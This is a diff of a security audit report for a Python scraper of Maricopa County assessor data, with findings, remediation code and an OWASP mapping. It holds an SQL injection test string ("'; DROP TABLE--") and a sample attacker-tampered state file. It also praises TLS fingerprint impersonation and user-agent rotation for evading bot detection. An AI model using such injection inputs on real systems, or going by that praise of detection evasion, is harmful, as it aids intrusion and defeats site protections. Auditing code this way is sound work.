-    ConstructionYear: Optional[int] = None
-    OriginalConstructionYear: Optional[int] = None
-    NumberOfGarages: Optional[int] = None
-    Pool: Optional[str] = None
-    LivableSpace: Optional[int] = None
-    BathFixtures: Optional[int] = None
-    RoofType: Optional[str] = None
-    ExteriorWalls: Optional[str] = None
-
-async def _get_official_parcel(self, apn: str) -> ParcelData | None:
-    """Get parcel data from Official API with schema validation."""
-    headers = {"AUTHORIZATION": self._token}
-
-    try:
-        # Get parcel details
-        url = f"{OFFICIAL_API_BASE}/parcel/{apn}"
-        response = await self._http.get(url, headers=headers)
-        response.raise_for_status()
-        parcel_data = response.json()
-
-        # Validate schema
-        try:
-            parcel = MaricopaParcelResponse(**parcel_data)
-        except ValidationError as e:
-            logger.error(f"Invalid parcel response for {apn}: {e}")
-            return None
-
-        # Get residential details with validation
-        await self._apply_rate_limit()
-        res_url = f"{OFFICIAL_API_BASE}/parcel/{apn}/residential-details"
-        residential_data = {}
-        try:
-            res_response = await self._http.get(res_url, headers=headers)
-            if res_response.status_code == 200:
-                residential_data = res_response.json()
-                residential = MaricopaResidentialResponse(**residential_data)
-            else:
-                residential = MaricopaResidentialResponse()
-        except ValidationError as e:
-            logger.warning(f"Invalid residential response for {apn}: {e}")
-            residential = MaricopaResidentialResponse()
-        except Exception:
-            residential = MaricopaResidentialResponse()
-
-        # Extract valuation safely
-        valuations = parcel.Valuations
-        valuation = valuations[0] if valuations else {}
-
-        return self._map_official_response(
-            apn,
-            parcel.model_dump(),
-            residential.model_dump(),
-            valuation
-        )
-```
-
----
-
-### MED-003: Race Condition in Concurrent Access to Enrichment File
-
-**File:** `scripts/extract_county_data.py:448-449`
-**Severity:** MEDIUM
-**CVSS Score:** 4.8 (Medium)
-
-```python
-# extract_county_data.py (lines 447-449)
-# Load existing enrichment data
-enrichment = load_enrichment(args.enrichment)
-logger.info(f"Loaded {len(enrichment)} existing enrichment records")
-```
-
-**Issue:**
-No file locking mechanism. If multiple instances run simultaneously, data corruption can occur.
-
-**Impact:**
-- Data corruption with concurrent writes
-- Lost updates if processes overwrite each other
-- Difficult to debug intermittent corruption
-
-**Remediation:**
-```python
-import fcntl
-import contextlib
-
-@contextlib.contextmanager
-def locked_file_access(file_path: Path, mode: str = 'r'):
-    """Context manager for file access with exclusive locking.
-
-    Args:
-        file_path: Path to file
-        mode: File open mode
-
-    Yields:
-        Open file handle with exclusive lock
-
-    Example:
-        with locked_file_access(path, 'r') as f:
-            data = json.load(f)
-    """
-    lock_path = file_path.with_suffix('.lock')
-    lock_fd = None
-
-    try:
-        # Acquire lock
-        lock_fd = open(lock_path, 'w')
-        fcntl.flock(lock_fd, fcntl.LOCK_EX)
-
-        # Open file
-        with open(file_path, mode, encoding='utf-8') as f:
-            yield f
-
-    finally:
-        # Release lock
-        if lock_fd:
-            fcntl.flock(lock_fd, fcntl.LOCK_UN)
-            lock_fd.close()
-
-        # Cleanup lock file
-        try:
-            lock_path.unlink()
-        except OSError:
             pass
 
-def load_enrichment(path: Path) -> dict:
-    """Load enrichment data with file locking."""
-    if not path.exists():
-        return {}
+        # Test with actual symlink creation
+        test_dir = self.views_dir / ".symlink_test"
+        test_link = self.views_dir / ".symlink_test_link"
+        try:
+            test_dir.mkdir(parents=True, exist_ok=True)
 
-    try:
-        with locked_file_access(path, 'r') as f:
+            # Verify no existing link/junction
+            if test_link.exists() or test_link.is_symlink():
+                test_link.unlink()
+
+            # Try directory junction (works without admin)
+            import subprocess
+            subprocess.run(
+                ['mklink', '/J', str(test_link), str(test_dir)],
+                shell=True,
+                check=True,
+                capture_output=True
+            )
+            test_link.unlink()
+            test_dir.rmdir()
+            return True
+        except Exception:
+            logger.warning("Symlinks/junctions not available. Using copies.")
+            if test_dir.exists():
+                test_dir.rmdir()
+            return False
+    return True
+```
+
+**Risk Score:** MEDIUM (degrades to less efficient copies on Windows)
+
+---
+
+#### ✅ LOW PRIORITY (P3)
+
+**L-1: Relative Path Symlinks**
+
+**Location:** `symlink_views.py:267-269`
+
+**Issue:** Relative symlinks could break if directory structure changes, but this is by design for portability.
+
+**Recommendation:** Document symlink behavior in code comments. No code change needed.
+
+---
+
+## 4. Authentication & Secrets Management
+
+**Files:**
+- `src/phx_home_analysis/services/image_extraction/extractors/maricopa_assessor.py`
+- `src/phx_home_analysis/services/infrastructure/browser_pool.py`
+
+### Findings
+
+#### ✅ STRENGTHS
+
+1. **Environment Variable Secrets** (maricopa_assessor.py:81)
+   ```python
+   self._token = token or os.getenv("MARICOPA_ASSESSOR_TOKEN")
+   ```
+   - No hardcoded credentials
+   - Environment-based configuration
+   - Supports injection for testing
+
+2. **Authentication Failure Handling** (maricopa_assessor.py:214-218)
+   ```python
+   if response.status_code == 401 or response.status_code == 403:
+       raise AuthenticationError(
+           self.source,
+           f"Authentication failed: {response.status_code}",
+       )
+   ```
+   - Explicit auth error detection
+   - Fails securely on 401/403
+
+3. **Token Validation** (maricopa_assessor.py:133-137)
+   ```python
+   if not self._token:
+       raise AuthenticationError(
+           self.source,
+           "MARICOPA_ASSESSOR_TOKEN environment variable not set",
+       )
+   ```
+   - Early validation before API calls
+   - Clear error messages
+
+4. **Proxy Credential Handling** (browser_pool.py:95-108)
+   ```python
+   self._proxy_has_auth = bool(
+       proxy_url and "@" in proxy_url and "://" in proxy_url
+   )
+   logger.info(
+       "BrowserPool configured: proxy=%s (auth=%s)",
+       "enabled" if proxy_url else "disabled",
+       "yes" if self._proxy_has_auth else "no",
+   )
+   ```
+   - Detects authenticated proxies
+   - Uses Chrome extension for proxy auth (avoids command-line exposure)
+
+5. **Proxy Extension Security** (browser_pool.py:163-189)
+   - Creates temporary extension for proxy auth
+   - Cleanup on error and normal exit
+   - Avoids credentials in command-line arguments (visible in process list)
+
+#### 🔴 HIGH PRIORITY (P1)
+
+**H-3: Credentials in Logs**
+
+**Location:** Multiple files (maricopa_assessor.py:206, browser_pool.py:161)
+
+**Issue:** Proxy URLs and API tokens could be logged, exposing credentials.
+
+**Examples:**
+```python
+# browser_pool.py:161 - logs full proxy URL with credentials
+logger.info(
+    "Creating proxy authentication extension for: %s",
+    self.proxy_url.split("@")[1]  # Still logs host, may log partial creds
+)
+
+# maricopa_assessor.py:206 - logs API URL that may contain tokens
+url = f"{self.source.base_url}/search/property/?q={query_encoded}"
+# If logged, could expose sensitive data
+```
+
+**Impact:** Credential exposure in log files, monitoring systems
+
+**Remediation:**
+```python
+# Create sanitization helper:
+def sanitize_url(url: str) -> str:
+    """Remove credentials from URL for logging."""
+    from urllib.parse import urlparse, urlunparse
+    parsed = urlparse(url)
+    if parsed.username or parsed.password:
+        # Replace with ***
+        netloc = f"{parsed.hostname}"
+        if parsed.port:
+            netloc += f":{parsed.port}"
+        parsed = parsed._replace(netloc=netloc)
+    return urlunparse(parsed)
+
+# Use in logging:
+logger.info(
+    "Creating proxy extension for: %s",
+    sanitize_url(self.proxy_url)
+)
+
+# Sanitize all URL logging:
+logger.debug("Downloading from %s", sanitize_url(url))
+```
+
+**Risk Score:** HIGH (credential exposure in logs)
+
+---
+
+#### ⚠️ MEDIUM PRIORITY (P2)
+
+**M-6: No Token Rotation Support**
+
+**Location:** `maricopa_assessor.py:81`
+
+**Issue:** Tokens are loaded once at initialization. No support for runtime rotation or expiry handling.
+
+**Remediation:**
+```python
+class MaricopaAssessorExtractor(ImageExtractor):
+    def __init__(self, ...):
+        self._token = None
+        self._token_refresh_fn = None
+
+    def _get_token(self) -> str:
+        """Get current valid token with refresh support."""
+        if self._token_refresh_fn:
+            self._token = self._token_refresh_fn()
+        elif not self._token:
+            self._token = os.getenv("MARICOPA_ASSESSOR_TOKEN")
+
+        if not self._token:
+            raise AuthenticationError(...)
+
+        return self._token
+
+    def set_token_refresh(self, refresh_fn):
+        """Register token refresh callback for rotation."""
+        self._token_refresh_fn = refresh_fn
+```
+
+**Risk Score:** MEDIUM (limits security best practices, not exploitable)
+
+---
+
+**M-7: Proxy Extension Cleanup Timing**
+
+**Location:** `browser_pool.py:336-345`
+
+**Issue:** Proxy extension is only cleaned up when browser closes. If browser crashes, temporary extension directory persists with credentials.
+
+**Remediation:**
+```python
+import atexit
+
+def __init__(self, ...):
+    # Existing code...
+
+    # Register cleanup on process exit
+    if self._proxy_extension:
+        atexit.register(self._cleanup_proxy_extension)
+
+def _cleanup_proxy_extension(self):
+    """Cleanup proxy extension safely."""
+    if self._proxy_extension is not None:
+        try:
+            self._proxy_extension.cleanup()
+        except Exception as e:
+            logger.error("Error cleaning up proxy extension: %s", e)
+        finally:
+            self._proxy_extension = None
+```
+
+**Risk Score:** MEDIUM (credential exposure via temp files)
+
+---
+
+## 5. State File Integrity
+
+**Files:**
+- `src/phx_home_analysis/services/image_extraction/state_manager.py`
+- `src/phx_home_analysis/services/image_extraction/orchestrator.py`
+
+### Findings
+
+#### ✅ STRENGTHS
+
+1. **Atomic State Writes** (state_manager.py:159-195)
+   ```python
+   fd, temp_path = tempfile.mkstemp(dir=self.state_path.parent, suffix=".tmp")
+   try:
+       with os.fdopen(fd, "w", encoding="utf-8") as f:
+           json.dump(self._state.to_dict(), f, indent=2)
+       os.replace(temp_path, self.state_path)  # Atomic
+   ```
+   - Prevents corruption from crashes
+   - Atomic replace on both Unix and Windows
+   - Cleanup on exception
+
+2. **State Validation** (state_manager.py:52-66)
+   ```python
+   return cls(
+       completed_properties=set(data.get("completed_properties", [])),
+       failed_properties=set(data.get("failed_properties", [])),
+       ...
+   )
+   ```
+   - Type conversion (list → set)
+   - Default values for missing fields
+   - Graceful handling of malformed data
+
+3. **Concurrency Control** (orchestrator.py:130-131, 365-416)
+   ```python
+   self._state_lock = asyncio.Lock()
+
+   async with self._state_lock:
+       # State mutations...
+   ```
+   - asyncio.Lock prevents race conditions
+   - All state writes are protected
+   - Manifest updates also locked
+
+4. **Timestamping** (state_manager.py:68-76)
+   ```python
+   self.property_last_checked[address] = datetime.now().astimezone().isoformat()
+   ```
+   - ISO 8601 timestamps with timezone
+   - Audit trail for all checks
+
+5. **Error Recovery** (state_manager.py:143-157)
+   ```python
+   try:
+       with open(self.state_path, encoding="utf-8") as f:
+           data = json.load(f)
+           self._state = ExtractionState.from_dict(data)
+   except (OSError, json.JSONDecodeError) as e:
+       logger.warning(f"Failed to load state: {e}")
+   self._state = ExtractionState()  # Default to empty
+   ```
+   - Handles corrupted state files
+   - Starts fresh if unreadable
+
+#### ⚠️ MEDIUM PRIORITY (P2)
+
+**M-8: No State File Integrity Verification**
+
+**Location:** `state_manager.py:145-147`
+
+**Issue:** State files are loaded without integrity verification. An attacker with file system access could tamper with state to skip properties or mark malicious properties as completed.
+
+**Exploitation Scenario:**
+```json
+// Attacker modifies extraction_state.json
+{
+  "completed_properties": [
+    "123 Main St",
+    "ATTACKER_CONTROLLED_PROPERTY"  // Marks as completed to skip
+  ],
+  "last_updated": "2025-12-02T10:00:00-07:00"
+}
+```
+
+**Impact:**
+- Skip extraction of legitimate properties
+- Mark malicious properties as clean
+- Manipulate extraction statistics
+
+**Remediation:**
+```python
+import hashlib
+import hmac
+
+class StateManager:
+    def __init__(self, state_path: Path, integrity_key: str | None = None):
+        self.state_path = Path(state_path)
+        self.integrity_key = integrity_key or os.getenv("STATE_INTEGRITY_KEY")
+        self._state: ExtractionState | None = None
+
+    def _compute_hmac(self, data: dict) -> str:
+        """Compute HMAC for state data integrity."""
+        if not self.integrity_key:
+            return ""
+
+        canonical = json.dumps(data, sort_keys=True)
+        return hmac.new(
+            self.integrity_key.encode(),
+            canonical.encode(),
+            hashlib.sha256
+        ).hexdigest()
+
+    def save(self, state: ExtractionState | None = None) -> None:
+        # ... existing code ...
+
+        state_dict = self._state.to_dict()
+
+        # Add HMAC if key configured
+        if self.integrity_key:
+            state_dict['_hmac'] = self._compute_hmac(state_dict)
+
+        with os.fdopen(fd, "w", encoding="utf-8") as f:
+            json.dump(state_dict, f, indent=2)
+        # ... rest of save logic ...
+
+    def load(self) -> ExtractionState:
+        # ... existing load logic ...
+
+        with open(self.state_path, encoding="utf-8") as f:
             data = json.load(f)
 
-        # Convert list format to dict format
-        if isinstance(data, list):
-            return {item.get("full_address"): item for item in data if item.get("full_address")}
-        return data
+            # Verify HMAC if present
+            if '_hmac' in data and self.integrity_key:
+                stored_hmac = data.pop('_hmac')
+                computed_hmac = self._compute_hmac(data)
 
-    except (json.JSONDecodeError, OSError) as e:
-        logger.error(f"Failed to load enrichment: {e}")
-        return {}
+                if not hmac.compare_digest(stored_hmac, computed_hmac):
+                    raise ValueError("State file integrity check failed (HMAC mismatch)")
 
-def save_enrichment(path: Path, data: dict) -> None:
-    """Save enrichment data with file locking."""
-    path.parent.mkdir(parents=True, exist_ok=True)
-
-    data_list = [
-        {"full_address": addr, **props}
-        for addr, props in data.items()
-    ]
-
-    # Atomic write with locking
-    temp_path = path.with_suffix('.tmp')
-
-    try:
-        with locked_file_access(temp_path, 'w') as f:
-            json.dump(data_list, f, indent=2, ensure_ascii=False)
-
-        # Atomic rename
-        os.replace(temp_path, path)
-
-    except Exception as e:
-        try:
-            temp_path.unlink()
-        except OSError:
-            pass
-        raise
+            self._state = ExtractionState.from_dict(data)
 ```
+
+**Risk Score:** MEDIUM (requires file system access, limited impact)
 
 ---
 
-### MED-004: No Timeout on HTTP Client Operations
+**M-9: No Schema Versioning**
 
-**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:75-102`
-**Severity:** MEDIUM
-**CVSS Score:** 4.0 (Medium)
+**Location:** `state_manager.py:38-49`, `orchestrator.py:178-184`
 
-```python
-# assessor_client.py (lines 75-102)
-def __init__(
-    self,
-    token: str | None = None,
-    timeout: float = 30.0,  # Default timeout set
-    rate_limit_seconds: float = 1.5,
-):
-    """Initialize client.
-
-    Args:
-        token: API token (defaults to MARICOPA_ASSESSOR_TOKEN env var)
-        timeout: Request timeout in seconds
-        rate_limit_seconds: Delay between API calls
-    """
-    self._token = token or os.getenv("MARICOPA_ASSESSOR_TOKEN")
-    self._timeout = timeout
-    self._rate_limit_seconds = rate_limit_seconds
-    self._last_call = 0.0
-    self._http: httpx.AsyncClient | None = None
-
-async def __aenter__(self) -> "MaricopaAssessorClient":
-    """Async context manager entry."""
-    self._http = httpx.AsyncClient(timeout=self._timeout)  # Applied here
-    return self
-```
-
-**Issue:**
-While timeout is configured, there's no protection against extremely slow responses that stay just under the timeout threshold (slowloris attack).
-
-**Impact:**
-- Resource exhaustion with slow API responses
-- Memory buildup with hanging connections
-- Service degradation
+**Issue:** State files don't include schema version. Future changes could break compatibility.
 
 **Remediation:**
 ```python
-import httpx
+# state_manager.py
+CURRENT_STATE_VERSION = "2.0"
 
-async def __aenter__(self) -> "MaricopaAssessorClient":
-    """Async context manager entry with comprehensive timeouts."""
-    # Configure granular timeouts
-    timeout_config = httpx.Timeout(
-        connect=5.0,     # Max 5s to establish connection
-        read=30.0,       # Max 30s to read response
-        write=10.0,      # Max 10s to send request
-        pool=5.0         # Max 5s to acquire connection from pool
-    )
+def to_dict(self) -> dict:
+    return {
+        "version": CURRENT_STATE_VERSION,
+        "completed_properties": list(self.completed_properties),
+        # ... rest of fields
+    }
 
-    # Set connection limits
-    limits = httpx.Limits(
-        max_connections=10,       # Max total connections
-        max_keepalive_connections=5,  # Max idle connections
-        keepalive_expiry=30.0     # Close idle after 30s
-    )
+@classmethod
+def from_dict(cls, data: dict) -> "ExtractionState":
+    version = data.get("version", "1.0")
 
-    self._http = httpx.AsyncClient(
-        timeout=timeout_config,
-        limits=limits,
-        follow_redirects=True,
-        max_redirects=3,  # Prevent redirect loops
-    )
-    return self
+    if version == "1.0":
+        # Migrate from v1.0 to v2.0
+        data = cls._migrate_v1_to_v2(data)
+
+    # Current version handling...
 ```
+
+**Risk Score:** MEDIUM (forward compatibility issue)
 
 ---
 
-### MED-005: Incomplete Error Messages Hide Root Causes
+#### ✅ LOW PRIORITY (P3)
 
-**File:** `scripts/extract_county_data.py:489-491`
-**Severity:** MEDIUM
-**CVSS Score:** 3.1 (Low-Medium)
+**L-2: No State File Backup**
 
+**Location:** `state_manager.py:159-195`
+
+**Issue:** No automatic backup before overwriting. A backup would aid recovery from corruption.
+
+**Recommendation:**
 ```python
-# extract_county_data.py (lines 489-491)
-except Exception as e:
-    logger.error(f"  Error: {e}")
-    failed.append(prop.full_address)
+def save(self, state: ExtractionState | None = None) -> None:
+    # ... existing validation ...
+
+    # Backup existing file before overwrite
+    if self.state_path.exists():
+        backup_path = self.state_path.with_suffix('.json.bak')
+        shutil.copy2(self.state_path, backup_path)
+
+    # ... rest of save logic ...
 ```
 
-**Issue:**
-Generic exception handling without stack traces makes debugging difficult. Root cause information is lost.
-
-**Impact:**
-- Difficult to debug production issues
-- No visibility into error patterns
-- Poor troubleshooting experience
-
-**Remediation:**
-```python
-import traceback
-from typing import Dict, Counter
-
-# Track error patterns
-error_stats: Counter[str] = Counter()
-
-try:
-    parcel = await client.extract_for_address(prop.street)
-    # ... processing ...
-
-except httpx.HTTPStatusError as e:
-    # HTTP-specific errors
-    error_type = f"HTTP_{e.response.status_code}"
-    error_stats[error_type] += 1
-    logger.error(
-        f"  HTTP Error {e.response.status_code} for {prop.street}: {e.response.text[:100]}"
-    )
-    failed.append(prop.full_address)
-
-except httpx.TimeoutException as e:
-    # Timeout errors
-    error_stats["TIMEOUT"] += 1
-    logger.error(f"  Timeout for {prop.street} (>{client._timeout}s)")
-    failed.append(prop.full_address)
-
-except json.JSONDecodeError as e:
-    # JSON parsing errors
-    error_stats["JSON_PARSE"] += 1
-    logger.error(f"  Invalid JSON response for {prop.street}: {e}")
-    failed.append(prop.full_address)
-
-except Exception as e:
-    # Unexpected errors - log full traceback
-    error_stats[type(e).__name__] += 1
-    logger.error(
-        f"  Unexpected error for {prop.street}: {type(e).__name__}: {e}",
-        exc_info=True  # Includes full stack trace
-    )
-    failed.append(prop.full_address)
-
-# In summary, print error statistics
-print("\n" + "=" * 60)
-print("Error Statistics")
-print("=" * 60)
-for error_type, count in error_stats.most_common():
-    print(f"{error_type}: {count}")
-```
+**Risk Score:** LOW (operational improvement, not security issue)
 
 ---
 
-## LOW Issues (Hardening Recommendations)
+## 6. Network Security
 
-### LOW-001: Missing Content-Type Validation
+**Files:**
+- `src/phx_home_analysis/services/infrastructure/stealth_http_client.py`
+- `src/phx_home_analysis/services/infrastructure/browser_pool.py`
 
-**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:156, 188, 228`
-**Severity:** LOW
-**CVSS Score:** 3.1 (Low)
+### Findings
 
-**Issue:**
-API responses are parsed as JSON without verifying Content-Type header. Malicious servers could return HTML/XML as JSON.
+#### ✅ STRENGTHS
 
-**Remediation:**
-```python
-def validate_json_response(response: httpx.Response) -> dict:
-    """Validate response is JSON before parsing.
+1. **TLS/SSL Configuration** (orchestrator.py:297-312)
+   ```python
+   self._http_client = httpx.AsyncClient(
+       timeout=30.0,
+       follow_redirects=True,
+       limits=httpx.Limits(
+           max_connections=50,
+           max_keepalive_connections=20,
+       ),
+       headers={"User-Agent": "Mozilla/5.0 ..."}
+   )
+   ```
+   - Uses httpx with modern TLS defaults
+   - Certificate validation enabled by default
+   - Reasonable connection limits
 
-    Args:
-        response: HTTP response
+2. **Retry Logic with Backoff** (stealth_http_client.py:173-311)
+   ```python
+   for attempt in range(self.max_retries):
+       # ... download logic ...
+       if attempt < self.max_retries - 1:
+           wait_time = 2**attempt  # Exponential backoff
+           await asyncio.sleep(wait_time)
+   ```
+   - Exponential backoff (1s, 2s, 4s)
+   - Prevents hammering on failures
+   - Respects Retry-After headers (line 197)
 
-    Returns:
-        Parsed JSON data
+3. **Rate Limiting** (stealth_http_client.py:196-208)
+   ```python
+   if response.status_code == 429:
+       retry_after = int(response.headers.get("Retry-After", "60"))
+       logger.warning(f"Rate limited, retry after {retry_after}s")
+       if attempt < self.max_retries - 1:
+           await asyncio.sleep(retry_after)
+   ```
+   - Honors 429 responses
+   - Extracts Retry-After header
+   - Delays before retry
 
-    Raises:
-        ValueError: If response is not valid JSON
-    """
-    content_type = response.headers.get('content-type', '')
+4. **Timeout Configuration** (stealth_http_client.py:104)
+   ```python
+   session_kwargs = {
+       "impersonate": "chrome120",
+       "timeout": self.timeout,  # Default 30s
+   }
+   ```
+   - 30-second default timeout
+   - Prevents indefinite hangs
 
-    if 'application/json' not in content_type.lower():
-        raise ValueError(
-            f"Expected JSON response, got {content_type}"
-        )
+5. **User-Agent Rotation** (browser_pool.py:39-44)
+   ```python
+   USER_AGENTS = [
+       "Mozilla/5.0 (Windows NT 10.0; ...) Chrome/120.0.0.0",
+       "Mozilla/5.0 (Windows NT 10.0; ...) Chrome/119.0.0.0",
+       # Multiple realistic user agents
+   ]
+   ```
+   - Realistic Chrome user agents
+   - Version variation
+   - Avoids bot detection
 
-    try:
-        return response.json()
-    except json.JSONDecodeError as e:
-        raise ValueError(f"Invalid JSON: {e}") from e
+6. **Stealth Fingerprinting** (stealth_http_client.py:103)
+   ```python
+   "impersonate": "chrome120"
+   ```
+   - curl_cffi mimics Chrome TLS fingerprint
+   - Harder to detect as bot
 
-# Use in API methods
-response = await self._http.get(url, params=params, headers=headers)
-response.raise_for_status()
-data = validate_json_response(response)  # Safe parsing
-```
+#### ⚠️ MEDIUM PRIORITY (P2)
 
----
+**M-10: Certificate Pinning Not Implemented**
 
-### LOW-002: No User-Agent Header Set
+**Location:** `orchestrator.py:297-312`
 
-**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:101`
-**Severity:** LOW
-**CVSS Score:** 2.0 (Low)
-
-**Issue:**
-HTTP requests don't include User-Agent header. Some APIs may block requests without proper identification.
-
-**Remediation:**
-```python
-import platform
-
-async def __aenter__(self) -> "MaricopaAssessorClient":
-    """Async context manager entry."""
-    # Set informative User-Agent
-    user_agent = (
-        f"PHX-Home-Analysis/1.0 "
-        f"(Python/{platform.python_version()}; "
-        f"{platform.system()}/{platform.release()})"
-    )
-
-    self._http = httpx.AsyncClient(
-        timeout=self._timeout,
-        headers={
-            'User-Agent': user_agent,
-            'Accept': 'application/json',
-        }
-    )
-    return self
-```
-
----
-
-### LOW-003: Hardcoded API Endpoints
-
-**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:20-21`
-**Severity:** LOW
-**CVSS Score:** 1.0 (Informational)
-
-```python
-# assessor_client.py (lines 20-21)
-OFFICIAL_API_BASE = "https://mcassessor.maricopa.gov"
-ARCGIS_API_BASE = "https://gis.mcassessor.maricopa.gov/arcgis/rest/services/MaricopaDynamicQueryService/MapServer"
-```
-
-**Issue:**
-API endpoints are hardcoded. Changes require code modification.
-
-**Remediation:**
-```python
-# Add to environment variables
-MARICOPA_OFFICIAL_API_BASE=https://mcassessor.maricopa.gov
-MARICOPA_ARCGIS_API_BASE=https://gis.mcassessor.maricopa.gov/arcgis/rest/services/...
-
-# Read from env with defaults
-OFFICIAL_API_BASE = os.getenv(
-    "MARICOPA_OFFICIAL_API_BASE",
-    "https://mcassessor.maricopa.gov"
-)
-ARCGIS_API_BASE = os.getenv(
-    "MARICOPA_ARCGIS_API_BASE",
-    "https://gis.mcassessor.maricopa.gov/arcgis/rest/services/MaricopaDynamicQueryService/MapServer"
-)
-```
-
----
-
-### LOW-004: No Certificate Pinning
-
-**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:101`
-**Severity:** LOW
-**CVSS Score:** 3.3 (Low)
-
-**Issue:**
-HTTPS connections don't use certificate pinning. Susceptible to man-in-the-middle attacks if CA is compromised.
+**Issue:** No certificate pinning for critical domains (county assessor, CDNs). Vulnerable to MITM with compromised CA.
 
 **Remediation:**
 ```python
 import ssl
 import certifi
+from httpx import HTTPTransport
 
-async def __aenter__(self) -> "MaricopaAssessorClient":
-    """Async context manager with certificate verification."""
-    # Create SSL context with certificate verification
+# Create custom SSL context with pinning
+def create_pinned_transport(pins: dict[str, str]) -> HTTPTransport:
+    """Create transport with certificate pinning.
+
+    Args:
+        pins: Dict mapping hostname to SHA256 fingerprint
+    """
     ssl_context = ssl.create_default_context(cafile=certifi.where())
-    ssl_context.check_hostname = True
-    ssl_context.verify_mode = ssl.CERT_REQUIRED
 
-    # Optionally pin to specific certificate
-    # ssl_context.load_verify_locations(cafile="maricopa_county.pem")
-
-    self._http = httpx.AsyncClient(
-        timeout=self._timeout,
-        verify=ssl_context,  # Use custom SSL context
-    )
-    return self
-```
-
----
-
-## Security Controls Review
-
-### STRENGTHS (What's Working Well)
-
-#### 1. SQL Injection Prevention ✅
-**File:** `assessor_client.py:24-67`
-
-The `escape_like_pattern()` and `escape_sql_string()` functions provide robust SQL injection protection:
-
-```python
-def escape_like_pattern(value: str) -> str:
-    """Escape SQL LIKE pattern metacharacters."""
-    value = value.replace("\\", "\\\\")  # Escape backslash first
-    value = value.replace("%", "\\%")
-    value = value.replace("_", "\\_")
-    value = value.replace("'", "''")
-    return value
-```
-
-**Analysis:**
-- Correct escape order (backslash first prevents double-escaping)
-- Handles all SQL LIKE wildcards (%, _)
-- Escapes SQL string delimiters (')
-- Used consistently in all query construction
-
-**Test Coverage:**
-```python
-# Verify SQL injection protection
-def test_sql_injection_prevention():
-    # Malicious inputs
-    assert escape_like_pattern("'; DROP TABLE--") == "''; DROP TABLE--"
-    assert escape_like_pattern("100% done") == "100\\% done"
-    assert escape_like_pattern("file_name") == "file\\_name"
-```
-
----
-
-#### 2. Type Safety with Pydantic ✅
-**File:** `models.py:6-58`
-
-Strong type validation using dataclasses:
-
-```python
-@dataclass
-class ParcelData:
-    """Property data with type enforcement."""
-    apn: str
-    full_address: str
-    lot_sqft: int | None = None
-    year_built: int | None = None
-    # ... typed fields ...
-```
-
-**Benefits:**
-- Runtime type checking
-- Prevents type coercion errors
-- Clear API contracts
-
----
-
-#### 3. Safe Type Coercion ✅
-**File:** `assessor_client.py:432-472`
-
-Defensive programming with `_safe_int()`, `_safe_float()`, `_safe_bool()`:
-
-```python
-@staticmethod
-def _safe_int(value) -> int | None:
-    """Safely convert to int."""
-    if value is None:
-        return None
-    try:
-        if isinstance(value, str):
-            value = value.strip()
-            if not value:
-                return None
-        return int(float(value))
-    except (ValueError, TypeError):
-        return None
-```
-
-**Analysis:**
-- Graceful failure (returns None, not crash)
-- Handles edge cases (empty strings, whitespace)
-- Prevents injection via type coercion
-
----
-
-#### 4. Rate Limiting ✅
-**File:** `assessor_client.py:109-116`
-
-Proper API rate limiting prevents abuse:
-
-```python
-async def _apply_rate_limit(self) -> None:
-    """Apply rate limiting between API calls."""
-    import time
-    elapsed = time.time() - self._last_call
-    if elapsed < self._rate_limit_seconds:
-        await asyncio.sleep(self._rate_limit_seconds - elapsed)
-    self._last_call = time.time()
-```
-
-**Benefits:**
-- Prevents API rate limit violations
-- Respects server resources
-- Configurable via CLI argument
-
----
-
-### WEAKNESSES (Areas Needing Improvement)
-
-#### 1. Secrets Management ❌
-- API token committed to repository (.env file tracked)
-- No secret rotation mechanism
-- Tokens potentially logged in error messages
-- No secret scanning in CI/CD
-
-#### 2. File System Security ❌
-- Path traversal vulnerabilities
-- No atomic file writes
-- No file locking for concurrent access
-- Missing backup mechanism
-
-#### 3. Input Validation ⚠️
-- Address strings not validated before processing
-- No length limits on user input
-- Missing character set validation
-
-#### 4. Error Handling ⚠️
-- Generic exception handling hides root causes
-- No structured error tracking
-- Limited troubleshooting information
-
----
-
-## Compliance Assessment
-
-### OWASP Top 10 (2021) Mapping
-
-| Risk | Status | Notes |
-|------|--------|-------|
-| A01: Broken Access Control | ✅ PASS | Token-based auth properly implemented |
-| A02: Cryptographic Failures | ❌ FAIL | Secrets in repository |
-| A03: Injection | ✅ PASS | SQL injection prevented |
-| A04: Insecure Design | ⚠️ PARTIAL | File system vulnerabilities |
-| A05: Security Misconfiguration | ❌ FAIL | .env committed, no hardening |
-| A06: Vulnerable Components | ✅ PASS | Dependencies appear current |
-| A07: Auth/Authorization Failures | ✅ PASS | Proper token handling (except logging) |
-| A08: Data Integrity Failures | ⚠️ PARTIAL | No atomic writes, no checksums |
-| A09: Security Logging Failures | ⚠️ PARTIAL | Insufficient error tracking |
-| A10: Server-Side Request Forgery | ✅ PASS | URLs validated, no user-controlled endpoints |
-
-**Overall Grade:** C+ (Passing core security, failing secrets management)
-
----
-
-## Recommended Remediation Priorities
-
-### Phase 1: IMMEDIATE (This Week)
-
-1. **Remove .env from git history** (CRIT-001)
-   - Execute git filter-branch command
-   - Rotate all exposed credentials
-   - Add pre-commit hook to block secrets
-
-2. **Implement path validation** (HIGH-001)
-   - Add `validate_file_path()` function
-   - Apply to all CLI path arguments
-   - Add tests for traversal attacks
-
-3. **Add atomic file writes** (HIGH-002)
-   - Implement temp-file-rename pattern
-   - Add backup mechanism
-   - Test interruption scenarios
-
-### Phase 2: SHORT TERM (Next 2 Weeks)
-
-4. **Fix token logging** (HIGH-003)
-   - Add sensitive data filter to logging
-   - Implement safe exception handling
-   - Audit all log statements
-
-5. **Batch file operations** (HIGH-004)
-   - Reduce write frequency
-   - Add progress checkpoints
-   - Implement recovery mechanism
-
-6. **Add input validation** (MED-001)
-   - Validate address strings
-   - Add length limits
-   - Sanitize special characters
-
-### Phase 3: MEDIUM TERM (Next Month)
-
-7. **Implement API response validation** (MED-002)
-   - Add Pydantic schemas for API responses
-   - Validate before processing
-   - Add schema version checking
-
-8. **Add file locking** (MED-003)
-   - Implement fcntl-based locking
-   - Add lock timeout handling
-   - Test concurrent access
-
-9. **Improve error handling** (MED-005)
-   - Add structured error tracking
-   - Include stack traces in logs
-   - Generate error statistics
-
-### Phase 4: LONG TERM (Ongoing)
-
-10. **Hardening improvements** (LOW-001 through LOW-004)
-    - Add Content-Type validation
-    - Set User-Agent headers
-    - Configure certificate pinning
-    - Externalize API endpoints
-
----
-
-## Testing Recommendations
-
